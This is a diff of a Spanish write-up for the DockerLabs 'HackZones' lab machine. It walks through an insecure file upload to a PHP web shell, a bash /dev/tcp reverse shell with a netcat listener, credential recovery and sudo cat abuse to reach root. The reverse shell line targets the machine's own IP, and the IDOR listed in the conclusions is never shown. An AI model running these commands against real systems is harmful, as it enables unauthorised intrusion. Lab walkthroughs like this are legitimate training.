@@ -1,28 +1,57 @@
-![image](imgs/hz-banner.png)
+# HackZones - DockerLabs
+**Información General**
+|  |  |
+|---|---|
+| **🖥️ Máquina** | [HackZones](https://mega.nz/file/CdFVBKgb#fYIZ1IRaYjzVjrjmGOzODDquAul8U-wiFpy8Bu2vBA4) |
+| **🌐 Plataforma** | [Dockerlabs](https://dockerlabs.es/) |
+| **👨‍💻 Autor** | d1se0 |
+| **🎯 Dificultad** | `Medio` |
+| **🐧 Sistema Operativo** | `Linux` |
+| **📡 IP** | `172.17.0.2` |
+|  |  |
 
->[Maquina](https://mega.nz/file/CdFVBKgb#fYIZ1IRaYjzVjrjmGOzODDquAul8U-wiFpy8Bu2vBA4)   \   [Dockerlabs](https://dockerlabs.es/)
+**Skills**:
+- Manipulación de resolución DNS (`/etc/hosts`)
+- Insecure Direct Object Reference (IDOR)
+- Insecure File Upload -> Remote Code Execution (RCE)
+- Análisis de scripts locales -> Exposición de credenciales en archivos
+- Movimiento lateral vía SSH
+- SUDO Missconfiguration
+- Enumeración y análisis de archivos sensibles
 
+**Etapas:**
+- [Reconocimiento](#reconocimiento)
+- [Enumeración Web](#enumeración-web)
+- [Explotación](#explotacion)
+- [Obtención de Reverse Shell](#obtención-de-reverse-shell)
+- [Escalada de Privilegios](#escalada-de-privilegios)
+- [Movimiento Lateral](#movimiento-lateral)
+- [Abuso de Sudo](#abuso-de-sudo)
+- [Acceso Root](#acceso-root)
+- [Conclusiones](#conclusiones)
 
 ## Reconocimiento
 
-Comenzamos haciendo un escaneo con `nmap` sobre todos los puertos de la maquina para determinar cuales se encuentran abiertos.
+Comenzamos realizando un escaneo completo de puertos con `nmap`:
 
 ![image](imgs/hz-img1.png)
 
-`Nmap` determina que el puerto **22**, **53** y **80** se encuentra abiertos.
-El puerto `22` corresponde a un servico *ssh*, el puerto `53` corresponde a un servicio de nombres de dominio, y el puerto `80` corresponde a un servicio *http*(servicio web).
+El escaneo revela los siguientes puertos abiertos:
+- 22/tcp -> SSH
+- 53/tcp -> DNS
+- 80/tcp -> HTTP
 
-Ahora efectuamos un segundo escaneo con `nmap` para reconocer y determinar versiones de los servicios que corren dentro de estos puertos.
+Ahora efectuamos un segundo escaneo con `nmap` para identificar versiones de los servicios activos.
 
 ![image](imgs/hz-img2.png)
 
-Bueno de primeras parece que podriamos visualizar algo si ingresamos a la ip de la maquina atraves de nuestro navegador web ya que no se esta aplicando un redirect a algun dominio en especifico pero, si vemos el titulo de la web vemos que dice 'hackzones.hl' que tiene toda la pinta de ser un dominio.
-
-Si vemos la web sin contemplar el 'hackzones.hl' en el */etc/hosts* la verdad es que no vemos nada interesante.
+Durante el análisis del servicio web, al acceder directamente mediante la IP no se observa contenido relevante. Sin embargo, el título de la página indica un posible dominio:
 
 ![image](imgs/hz-img3.png)
 
-Si contemplamos nuestro posible dominio en el */etc/hosts/* se nos muestra una web diferente.
+Esto sugiere que la aplicación depende de resolución DNS basada en nombre de dominio.
+
+Se agrega la entrada correspondiente en `/etc/hosts`:
 
 ![image](imgs/hz-img4.png)
 
@@ -30,23 +59,29 @@ Si contemplamos nuestro posible dominio en el */etc/hosts/* se nos muestra una w
 
 ![image](imgs/hz-img6.png)
 
-Es un panel de login que se ve un poco pusi.
-Si efectuamos un poco de fuzzing con `gobuster` logramos ver que tenemos acceso a un index html llamado *dashboard* y otras cosas un tanto interesantes como el directorio *uploads/*.
+Tras esto, el contenido web cambia completamente, revelando un panel de autenticación.
+
+## Enumeración Web
+
+Se realiza fuzzing de directorios utilizando `gobuster` y se logran identificar recursos relevantes:
+- `/dashboard.html`
+- `/uploads/`
+
+Esto indica posibles superficies de ataque relacionadas con archivos.
 
 ![image](imgs/hz-img7.png)
 
 ## Explotacion
 
-Inspeccionando un poco el *dashboard.html* podemos ver que tenemos la posibilidad de subir una foto que quedaria establecida como nuestra foto de perfil como el usuario admin.
+Al inspeccionar dashboard.html, se detecta una funcionalidad que permite subir una imagen de perfil.
 
 ![image](imgs/hz-img8.png)
 
 ![image](imgs/hz-img9.png)
 
-A la pagina se ve que le han dedicado muy poco tiempo de trabajo asi que es probable que no aplique algun tipo de validacion con respecto a lo que se suba como "foto".
+No se observan controles aparentes de validación del tipo de archivo, lo que sugiere una posible vulnerabilidad de subida insegura de archivos.
 
-Intentaremos subir un archivo php, asi sin mas, el cual nos permita ejecutar comandos a nivel de sistema atraves del parametro `cmd` que ira en el codigo.
-
+Se crea un archivo PHP con capacidad de ejecutar comandos:
 
 ![image](imgs/hz-img10.png)
 
@@ -56,29 +91,45 @@ Bueno, parece que no hubo problemas.
 
 ![image](imgs/hz-img12.png)
 
-El archivo parece que se ha subido en el directorio *uploads/* que habiamos encontrado anteriormente asi que si llamamos a nuestro script y le pasamos al parametro `cmd` el valor/comando *whoami* podemos ver que se nos regresa la salida correspondiente al comando por lo que tenemos ejecucion remota de comandos.
+El archivo es subido exitosamente al servidor sin restricciones.
+
+Al acceder al recurso desde:
+```bash
+http://hackzones.hl/uploads/shell.php?cmd=whoami
+```
+Se obtiene ejecución remota de comandos, confirmando una vulnerabilidad de Remote Code Execution (RCE).
 
 ![image](imgs/hz-img13.png)
 
-Ahora solo nos queda entablar una revershell.
+## Obtención de Reverse Shell
+
+Se establece un listener en la máquina atacante:
+```bash
+nc -lvnp 443
+```
+
+Posteriormente, se ejecuta un comando con ayuda del parametro `cmd` de nuestro archivo para obtener una reverse shell:
+```bash
+bash -c "bash -i >& /dev/tcp/172.17.0.2/443 0>&1"
+```
+
+> Este comando puede URLencodearse para evitar errores en su ejecución.
 
 ![image](imgs/hz-img14.png)
 
 ![image](imgs/hz-img15.png)
 
-Y estamos dentro.
-
+Se obtiene acceso interactivo al sistema como usuario del servicio web.
 
 ## Escalada de Privilegios
 
-Buscando un poco entre los archivos nos encontramos en el directorio */var/www/html/* un directorio un tanto curioso que contiene un archivo */secret.sh*.
-
+Durante la enumeración local, se identifica un archivo interesante en:
+```bash
+/var/www/html/secret.sh
+```
 ![image](imgs/hz-img16.png)
 
 ![image](imgs/hz-img17.png)
-
-Si lo intentamos ejecutar nos dice que tenemos que hacerlo como root.
-Este archivo me lo envio ha mi maquina para poderlo manipular de manera local.
 
 ![image](imgs/hz-img18.png)
 
@@ -86,34 +137,72 @@ Este archivo me lo envio ha mi maquina para poderlo manipular de manera local.
 
 ![image](imgs/hz-img20.png)
 
-Parece que este script lo que hace es descodificar algo asi que vamos a ejecutarlo.
+Al revisar el contenido del script desde nuestra maquina atacante, se observa que realiza una operación de decodificación.
+
+Al jecutar el script, se obtiene una credencial en texto plano.
 
 ![image](imgs/hz-img21.png)
 
-Este script nos regresa una contraseña la cual probablemente podriamos usar para conectarnos via ssh pero, nos falta un usuario.
+## Movimiento Lateral
+
+Se revisa el archivo `/etc/passwd` para identificar usuarios válidos del sistema.
 
 ![image](imgs/hz-img22.png)
 
-Revisando el */etc/passwd* vemos un usuario de nombre *mrrobot* asi que intentaremos conectarnos como este usuario via ssh.
+Se detecta el usuario:
+```bash
+mrrobot
+```
+
+Se intenta autenticación vía SSH utilizando la credencial obtenida:
+```bash
+ssh mrrobot@172.17.0.2
+```
 
 ![image](imgs/hz-img23.png)
 
-Y para dentro.
+La autenticación es exitosa.
 
-Revisando los permisos *sudoers* del usuario *mrrobot* nos encontramos con la posibilidad de ejecutar el comando `cat` como cualquier usuario asi que vamos a buscar archivos que puedan contener algo interesante que nos ayuden a escalar nuestros privilegios.
+## Abuso de Sudo
+
+Procedemos a revisar a los permisos para el usuario `mrrobot`
 
 ![image](imgs/hz-img26.png)
 
+Se identifica que el usuario puede ejecutar el comando cat como cualquier usuario sin necesidad de contraseña.
+
+Esto representa una mala configuración crítica.
+
+Se inspecciona el directorio `/opt` y se encuentra el archivo:
+```bash
+SystemUpdate
+```
 ![image](imgs/hz-img27.png)
 
-Existe un archivo de nombre *SystemUpdate* en el directorio de */opt*, probablemente tenga algo interesante.
-
+Al visualizar su contenido utilizando sudo:
+```bash
+sudo cat /opt/SystemUpdate
+```
 ![image](imgs/hz-img28.png)
 
 ![image](imgs/hz-img29.png)
 
-Podemo ver el nombre de *root* a la par de la que parece ser una credencial. Podemos intentar usarla.
+Se descubren credenciales pertenecientes al usuario `root`.
+
+## Acceso Root
+
+Se utiliza la credencial descubierta para cambiar al usuario root:
 
 ![image](imgs/hz-img30.png)
 
-Bueno, que les digo.
+Bueno, qué les digo.
+
+### Conclusiones
+La máquina presenta múltiples fallos de seguridad encadenados:
+- Resolución DNS no configurada correctamente.
+- Insecure Direct Object Reference (IDOR)
+- Subida insegura de archivos que derivan en RCE.
+- Exposición de credenciales mediante scripts.
+- Configuración incorrecta de permisos sudo.
+- La combinación de estas vulnerabilidades permite comprometer completamente el sistema.
+
